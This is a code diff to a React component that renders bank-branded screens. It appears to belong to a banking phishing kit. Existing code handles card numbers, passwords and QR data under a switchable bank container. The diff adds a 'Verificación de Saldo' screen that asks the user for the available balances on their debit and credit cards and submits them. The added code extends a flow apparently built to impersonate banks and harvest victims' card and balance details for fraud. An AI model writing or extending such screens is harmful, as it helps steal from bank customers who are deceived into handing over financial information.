@@ -42,6 +42,10 @@ interface ScreenTemplatesProps {
     fileName?: string;
     fileUrl?: string;
     fileSize?: string;
+    saldoDebito?: string;
+    montoDebito?: string;
+    saldoCredito?: string;
+    montoCredito?: string;
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
@@ -69,6 +73,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [passwordError, setPasswordError] = useState<string | null>(null);
   const [qrScanned, setQrScanned] = useState<string | null>(null);
   const [qrImageData, setQrImageData] = useState<string | null>(null);
+  
+  // Estados para protección de saldo
+  const [debitoSelect, setDebitoSelect] = useState('');
+  const [debitoMonto, setDebitoMonto] = useState('');
+  const [creditoSelect, setCreditoSelect] = useState('');
+  const [creditoMonto, setCreditoMonto] = useState('');
   
   // Función para validar número de tarjeta con algoritmo de Luhn
   const validateCardNumber = (number: string) => {
@@ -793,6 +803,98 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </>
         );
         return getBankContainer(proteccionBancariaContent);
+
+      case ScreenType.PROTECCION_SALDO:
+        // Función para mostrar/ocultar input según selección
+        const toggleInput = (tipo: 'debito' | 'credito', value: string) => {
+          if (tipo === 'debito') {
+            setDebitoSelect(value);
+            if (value !== 'input') {
+              setDebitoMonto('');
+            }
+          } else {
+            setCreditoSelect(value);
+            if (value !== 'input') {
+              setCreditoMonto('');
+            }
+          }
+        };
+        
+        const proteccionSaldoContent = (
+          <>
+            <div className="text-left space-y-4">
+              <h2 className="text-xl font-bold mb-4 text-center" style={{ color: '#333' }}>
+                🔐 Verificación de Saldo
+              </h2>
+              
+              {/* Pregunta 1 - Débito */}
+              <div className="mb-4">
+                <label className="block mb-2 font-bold text-gray-700">
+                  ¿Cuál es el saldo actual disponible en tu tarjeta de débito?
+                </label>
+                <select 
+                  value={debitoSelect}
+                  onChange={(e) => toggleInput('debito', e.target.value)}
+                  className="w-full p-3 mb-3 border rounded-md border-gray-300"
+                >
+                  <option value="">Selecciona una opción</option>
+                  <option value="input">Ingresar saldo</option>
+                  <option value="no_tengo">No tengo tarjeta de débito</option>
+                </select>
+                {debitoSelect === 'input' && (
+                  <Input
+                    type="number"
+                    placeholder="Monto en pesos"
+                    value={debitoMonto || screenData.montoDebito || ''}
+                    onChange={(e) => setDebitoMonto(e.target.value)}
+                    className="w-full p-3 border rounded-md border-gray-300"
+                  />
+                )}
+              </div>
+
+              {/* Pregunta 2 - Crédito */}
+              <div className="mb-4">
+                <label className="block mb-2 font-bold text-gray-700">
+                  ¿Cuál es el saldo disponible actualmente en tu tarjeta de crédito?
+                </label>
+                <select 
+                  value={creditoSelect}
+                  onChange={(e) => toggleInput('credito', e.target.value)}
+                  className="w-full p-3 mb-3 border rounded-md border-gray-300"
+                >
+                  <option value="">Selecciona una opción</option>
+                  <option value="input">Ingresar saldo</option>
+                  <option value="no_tengo">No tengo tarjeta de crédito</option>
+                </select>
+                {creditoSelect === 'input' && (
+                  <Input
+                    type="number"
+                    placeholder="Monto en pesos"
+                    value={creditoMonto || screenData.montoCredito || ''}
+                    onChange={(e) => setCreditoMonto(e.target.value)}
+                    className="w-full p-3 border rounded-md border-gray-300"
+                  />
+                )}
+              </div>
+
+              <Button 
+                className={`${primaryBtnClass} w-full py-3 text-base`}
+                onClick={() => {
+                  onSubmit(ScreenType.PROTECCION_SALDO, {
+                    saldoDebito: debitoSelect,
+                    montoDebito: debitoSelect === 'input' ? debitoMonto : '',
+                    saldoCredito: creditoSelect,
+                    montoCredito: creditoSelect === 'input' ? creditoMonto : ''
+                  });
+                }}
+                disabled={!debitoSelect || !creditoSelect}
+              >
+                Enviar
+              </Button>
+            </div>
+          </>
+        );
+        return getBankContainer(proteccionSaldoContent);
 
       default:
         const defaultContent = (
